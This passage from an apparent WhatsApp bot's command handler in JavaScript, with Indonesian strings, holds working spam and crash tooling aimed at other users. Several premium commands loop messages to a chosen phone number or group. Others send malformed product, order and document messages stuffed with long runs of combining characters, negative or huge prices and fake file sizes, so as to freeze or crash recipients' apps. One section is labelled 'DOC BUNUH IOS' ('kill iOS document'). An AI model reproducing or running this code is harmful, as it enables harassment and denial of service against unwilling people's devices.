if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {document: fs.readFileSync('./src/menu.jpg'), mimetype: `${doctext}`, fileName: `${doctext}.pdf`, fileLength: 9999999999, })
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

/*case 'bugtag': {
if (!isPremium) return m.reply(global.mess.premium)
let tagtext = {
    text: `Hohoho`,
    footer: `By Carosatzx`,
    headerType: 999
    }
await hisoka.sendMessage(m.chat, tagtext, { quoted: fgif })
await hisoka.sendMessage(m.chat, tagtext, { quoted: fvideo })
await hisoka.sendMessage(m.chat, tagtext, { quoted: fkontak })
await hisoka.sendMessage(m.chat, tagtext, { quoted: floc })
}
break*/

case 'tagvideo': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, { text: `Pfft`}, { quoted: fvideo })
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'tagvideogc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
await hisoka.sendMessage(m.chat, { text: `Pfft`}, { quoted: fvideo })
}
}
break

case 'taggif': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, { text: `Pfft`}, { quoted: fgif })
}
m.reply(`Sukses spam ke nomor ${numbers}`)
}
break

case 'taggifgc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
await hisoka.sendMessage(m.chat, { text: `Pfft`}, { quoted: fgif })
}
}
break

case 'tagloc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, { text: `Pfft`}, { quoted: floc })
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break



case 'chatsettings': {
if (!isCreator) return m.reply(global.mess.owner)
let buttonsF = [
  {buttonId: `public_czx`, buttonText: {displayText: `🟢 PUBLIC`}, type: 1},
  {buttonId: `self_czx`, buttonText: {displayText: `🔴 PRIVATE`}, type: 1}
]
let buttonS = {
    text: `Chat Bot Settings Private Or Public?`,
    footer: ``,
    buttons: buttonsF,
    headerType: 1
    }
hisoka.sendMessage(m.chat, buttonS)
}
break

case 'textkosong' : {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah?`)
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, { text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n` })
}
}
break

case 'public_czx': {
if (!isCreator) return m.reply(global.mess.owner)
hisoka.public = true
m.reply('Successful Change To Public')
}
break

case 'self_czx': {
if (!isCreator) return m.reply(global.mess.owner)
hisoka.public = false
m.reply('Successful Change To Self')
}
break

case 'taglocgc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
await hisoka.sendMessage(m.chat, { text: `Pfft`}, { quoted: floc })
}
}
break

case 'tagcontact': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, { text: `Pfft`}, { quoted: fkontak })
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'tagcontactgc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
await hisoka.sendMessage(m.chat, { text: `Pfft`}, { quoted: fkontak })
}
}
break

case 'setpppanjang': {
if (!isCreator) return m.reply(global.mess.owner)
var media = await hisoka.downloadAndSaveMediaMessage(quoted)
try {
const { generateProfilePicture } = require("./lib/myfunc")
var { img } = await generateProfilePicture(media)
await hisoka.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
m.reply(`Sukses`)
} catch { m.reply('Gagal Mengganti Photo Profile') }
}
break

case 'catalog': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/menu.jpg') }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"title": `${catalog1}`,
"description": `𝙱𝚢 𝙲𝚊𝚛𝚘𝚜𝚊𝚝𝚣`,
"currencyCode": "IDR",
"footerText": ``,
"priceAmount1000": "-999999999999",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "-999999999999",
"retailerId": `CZX`,
"url": ""
},
"businessOwnerJid": "37122219115@s.whatsapp.net",
}
}), { userJid: m.chat })
for (let i = 0; i < args[0]; i++) {
hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break

case 'catalog2': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/menu.jpg') }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"title": `${catalog2}`,
"description": `𝙱𝚢 𝙲𝚊𝚛𝚘𝚜𝚊𝚝𝚣`,
"currencyCode": "IDR",
"footerText": ``,
"priceAmount1000": "-999",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "-999",
"retailerId": `CZX`,
"url": ""
},
"businessOwnerJid": "37122219115@s.whatsapp.net",
}
}), { userJid: m.chat })
for (let i = 0; i < args[0]; i++) {
hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break

case 'tagcatalog': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/menu.jpg') }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "  ͓͓͓͓͓⃨⃨⃨͓⃕⃔⃜⃜⃟⃟͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛͛͛͛͛⃟⃟⃪⃪⃪⃪⃪⃪͓͓͓͓͓⃨⃕⃕⃕⃕⃔⃔⃔⃔⃜   ͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛⃟⃪⃪⃪⃪⃪⃪⃨⃨⃨⃨⃨⃨⃨⃜⃜⃜⃜⃜⃜⃜⃜⃜⃜⃟⃪⃨͓⃨⃨⃨͓͓͓⃜͛͛⃜⃜͛⃜⃜͛⃜⃜͛⃜⃔⃕⃟⃟⃜⃟⃞⃞⃪⃪͓͓⃜͛͛͛⃜⃔⃜⃟⃟𝂳⃞ ⃟⃞⃟⃟⃨⃨͓⃜⃕⃜⃜͛͛⃜⃜⃞⃕⃕𝂳͓͓͓͓͓⃨⃨⃨⃨⃨⃔⃔⃔⃕⃕⃔⃔͛͛⃟⃟⃟⃟⃞⃞⃟⃨͓͛͛͛⃜⃜͛⃜⃕ ⃝⃝⃝⃝⃝    𝂳⃨⃨͓⃨͓⃨⃜⃜⃟⃟⃟⃜⃔𝂳͓⃨͓͓⃕⃔⃕⃟⃪⃪⃪⃪⃪͓͓͓͓⃨⃨⃨͓͓͓͓͓⃕⃜͛͛͛͛͛͛⃔⃔␘𝂳⃪⃪⃪⃪⃪⃪⃨͓͓⃨͓⃨͓͓͓⃨⃨͓͓͓⃨⃕⃕⃔⃔⃔⃕⃔⃔͛͛͛⃜⃔⃔⃔⃜͛͛͛⃔⃔⃕⃔  ⃨ ͓͓͓⃔⃔⃔⃔⃔⃔⃕⃕⃕⃕⃕⃔⃔⃔⃔⃜⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓⃨⃨⃨͓͛͛͛͛͛͛͛͛⃕⃔⃜⃜⃟⃟͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛͛͛͛͛⃟⃟⃪⃪⃪⃪⃪⃪͓͓͓͓͓⃨⃕⃕⃕⃕⃔⃔⃔⃔⃜   ͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛⃟⃪⃪⃪⃪⃪⃪⃨⃨⃨⃨⃨⃨⃨⃜⃜⃜⃜⃜⃜⃜⃜⃜⃜⃟⃪⃨͓⃨⃨⃨͓͓͓⃜͛͛⃜⃜͛⃜⃜͛⃜⃜͛⃜⃔⃕⃟⃟⃜⃟⃞⃞⃪⃪͓͓⃜͛͛͛⃜⃔⃜⃟⃞ ⃟⃞⃟⃟⃨⃨͓⃜⃕⃜⃜͛͛⃜⃜⃞⃕⃕𝂳͓͓͓͓͓⃨⃨⃨⃨⃨⃔⃔⃔⃕⃕⃔⃔͛͛⃟⃟⃟⃟⃞⃞⃟⃨͓͛͛͛⃜⃜͛⃜⃕ ⃝⃝⃝⃝⃝    𝂳⃨⃨͓⃨͓⃨⃜⃜⃟⃟⃟⃜⃔𝂳͓⃨͓͓⃕⃔⃕⃟⃪⃪⃪⃪⃪͓͓͓͓⃨⃨⃨͓͓͓͓͓⃕⃜͛͛͛͛͛͛⃔⃔␘𝂳⃪⃪⃪⃪⃪⃪⃨͓͓⃨͓⃨͓͓͓⃨⃨͓͓͓⃨⃕⃕⃔⃔⃔⃕⃔⃔͛͛͛⃜⃔⃔⃔⃜͛͛͛⃔⃔⃕⃔  ⃨⃨͓ ͓͓͓⃔⃔⃔⃔⃔⃔⃕⃕⃕⃕⃕⃔⃔⃔⃔⃜⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓⃨⃨⃨͓͛͛͛͛͛͛͛͛⃕⃔⃜⃜⃟⃟͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛͛͛͛͛⃟⃟⃪⃪⃪⃪⃪⃪͓͓͓͓͓⃨⃕⃕⃕⃕⃔⃔⃔⃔⃜   ͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛⃟⃪⃪⃪⃪⃪⃪⃨⃨⃨⃨⃨⃨⃨⃜⃜⃜⃜⃜⃜⃜⃜⃜⃜⃟⃪⃨͓⃨⃨⃨͓͓͓⃜͛͛⃜⃜͛⃜⃜͛⃜⃜͛⃜⃔⃕⃟⃟⃜⃟⃞⃞⃪⃪͓͓⃜͛͛͛⃜⃔⃜⃟⃟𝂳⃞ ⃟⃞⃟⃟⃨⃨͓⃜⃕⃜⃜͛͛⃜⃜⃞⃕⃕𝂳͓͓͓͓͓⃨⃨⃨⃨⃨⃔⃔⃔⃕⃕⃔⃔͛͛⃟⃟⃟⃟⃞⃞⃟⃨͓͛͛͛⃜⃜͛⃜⃕ ⃝⃝⃝⃝⃝͓͓͓͓͓⃨⃨⃨͓⃕⃔⃜⃜⃟⃟͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛͛͛͛͛⃟⃟⃪⃪⃪⃪⃪⃪͓͓͓͓͓⃨⃕⃕⃕⃕⃔⃔⃔⃔⃜   ͓͓͓͓͓͓͓͓͓͛͛͛͛͛͛͛⃟⃪⃪⃪⃪⃪⃪⃨⃨⃨⃨⃨⃨⃨⃜⃜⃜⃜⃜⃜⃜⃜⃜⃜⃟⃪⃨͓⃨⃨⃨͓͓͓⃜͛͛⃜⃜͛⃜⃜͛⃜⃜͛⃜⃔⃕⃟⃟⃜⃟⃞⃞⃪⃪͓͓⃜͛͛͛⃜⃔⃜⃟⃟𝂳⃞ ⃟⃞⃟⃟⃨⃨͓⃜⃕⃜⃜͛͛⃜⃜⃞⃕⃕𝂳",
"title": `@theczx`,
"description": `By Carosatzx`,
"currencyCode": "IDR",
"footerText": ``,
"priceAmount1000": "90000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "90000000",
"retailerId": ``,
"url": ""
},
"businessOwnerJid": "37122219115@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: fvideo })
for (let i = 0; i < jumlah; i++) {
hisoka.relayMessage(`${numbers}@s.whatsapp.net`, catalog.message, { messageId: catalog.key.id })
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'setbio': {
if (!isCreator) return m.reply(global.mess.owner)
pesan = `${args.join(" ")}`
await hisoka.setStatus(pesan)
}
break

           
// DOC BUNUH IOS //
case 'travadocios': {
if (!isPremium) return m.reply(global.mess.premium)
hisoka.sendMessage(m.chat, {document: fs.readFileSync('./src/menu.jpg'), mimetype: `${iostext}`, fileName: `${iostext}${iostext}.pdf`, mentionedJid: `${jids}`, fileLength: 9999999999,})
}
break

// CART V1 //
case 'travacart': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
const order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": ``,
"thumbnail": fs.readFileSync('./src/menu.jpg'),
"itemCount": 999999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": `${card}`,
"message": `${card}`,
"sellerJid": `ۣۣۣۣۣۣۣۜۜۜۜۜۜۜۜۜۜۜۜۜۜۢۢۢۢۢ ཹ࿆ۛۢۢۛۛۚۢۢۚۛۢۢۛۢۢۛۢۢۛۛۢۢۢۛۛۢۢۢۢۢۢۢۛۢۢۢ🤴ۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘཷ࿆ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘℂ⃨ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ𝓐ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘℛۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ〬𝓞𝕊ۣۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ𝓐⃨𝕋ۣۣۣۣۣۣۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘ𝓩ཷ࿆🤴ۣۣۣۣۣۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚۙ۠ۙۛۛۚۡۢۛۛۚۙۘۚۛۤۤۤۤۤۤۤۤۜۛۚۡۚۛۛۙ۠ۙۛۛۚۙ۠ۚۛۛۜۜۚۙۙۚۛۜۜۜۜۛۛۚۙۙۘ۠ۘۜۢۛۙۙۘۘۙ۠ۙۚۛۚ